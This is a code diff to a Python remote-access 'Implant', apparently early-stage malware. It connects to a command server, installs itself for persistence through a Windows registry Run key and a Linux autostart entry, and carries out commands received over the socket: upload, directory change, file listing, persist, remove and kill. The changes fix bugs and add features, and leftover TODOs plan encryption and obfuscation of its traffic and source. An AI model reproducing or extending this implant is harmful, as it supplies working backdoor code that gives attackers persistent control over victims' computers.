@@ -6,6 +6,8 @@ import platform
 import getpass
 import sys
 import shutil
+import pickle
+
 
 class Implant(object):
 
@@ -16,7 +18,7 @@ class Implant(object):
         self.uid = getpass.getuser() + "_" + str(self.mac)
         self.installed = self.is_installed()
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.sock.connect('127.0.0.1', 4001)
+        self.sock.connect(('127.0.0.1', 4001))
         self.sock.send(str(self.mac).encode())
 
     def is_installed(self):
@@ -35,10 +37,10 @@ class Implant(object):
         # Note: can only install compiled implants
         # Is the implant compiled? (Pyinstaller adds the frozen value to the "sys" object)
         if not getattr(sys, "frozen", False):
-            # TODO server response: can only install compiled implants
+            self.sock.send("only compiled implants may be installed".encode())
             return
         if self.installed:
-            # TODO server response: already installed
+            self.sock.send("implant already installed".encode())
             return
         if platform.system() == "Linux":
             install_dir = self.os_path_expansion("~/.implant")
@@ -65,7 +67,7 @@ class Implant(object):
             shutil.copyfile(sys.executable, install_path)
             reg_cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v implant /t REG_SZ /d \"%s\"" % install_path
             subprocess.Popen(reg_cmd, shell=True)
-        # TODO server response: installed successfully
+        self.sock.send("implant installed".encode())
 
     def remove(self):
         # Uninstall the implant
@@ -76,7 +78,7 @@ class Implant(object):
             desktop_entry = self.os_path_expansion("~/.config/autostart/implant.desktop")
             if os.path.exists(desktop_entry):
                 os.remove(desktop_entry)
-            os.system("grep -v .ares .bashrc > .bashrc.tmp;mv .bashrc.tmp .bashrc")
+            os.system("grep -v .implant .bashrc > .bashrc.tmp;mv .bashrc.tmp .bashrc")
         elif platform.system() == "Windows":
             install_dir = os.path.join(os.getenv('USERPROFILE'), "implant")
             reg_cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v implant"
@@ -87,10 +89,11 @@ class Implant(object):
 
     def kill(self):
         self.sock.send("implant killed".encode())
+        self.sock.close()
         sys.exit(0)
 
     def os_path_expansion(self, path):
-        # Used for expanding relative paths based on working directory
+        # Used for expanding relative paths based on home directory
         return os.path.expandvars(os.path.expanduser(path))
 
     def upload(self, data):
@@ -127,8 +130,13 @@ class Implant(object):
         os.chdir(data)
         self.sock.send(("moved to " + os.getcwd() + "\n").encode())
 
+    def ls(self):
+        dir_list = os.listdir(os.getcwd())
+        data = pickle.dumps(dir_list)
+        self.sock.send(data)
+
     def run(self):
-        while(True):
+        while True:
             data = self.sock.recv(1024).decode()
             if data.split()[0] == "upload":
                 self.upload(data[7:])
@@ -142,6 +150,8 @@ class Implant(object):
                 self.kill()
             elif data.split()[0] == "persist":
                 self.persist()
+            elif data.split()[0] == "remove":
+                self.remove()
 
 
 def main():
@@ -199,12 +209,6 @@ if __name__ == "__main__":
 
 
 
-#TODO: Persistence Plan
-#TODO: Sending Files to Implant
-#TODO: Communicating with New Payloads
-#TODO: Stretch Goal: SMART Directory Traversal -- Find and only run in directories with -rwx
-#TODO: Using Implant to Move Payloads then die
-#TODO: Package Implant + Payloads with PyInstaller
 #TODO: Encrypt/Obfuscate Data Being Sent
 #TODO: Obfuscate the Source Files
 
